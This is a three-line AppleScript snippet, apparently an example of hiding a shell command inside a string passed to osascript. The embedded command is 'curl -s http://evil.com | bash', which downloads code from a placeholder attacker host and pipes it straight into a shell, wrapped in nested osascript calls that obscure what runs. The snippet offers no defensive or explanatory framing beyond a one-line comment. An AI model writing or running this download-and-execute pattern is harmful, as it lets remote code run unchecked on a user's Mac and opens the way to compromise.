-- Embed AppleScript as a string and execute it using osascript
set script to "do shell script \"curl -s http://evil.com | bash\""
do shell script "osascript -e " & quoted form of script
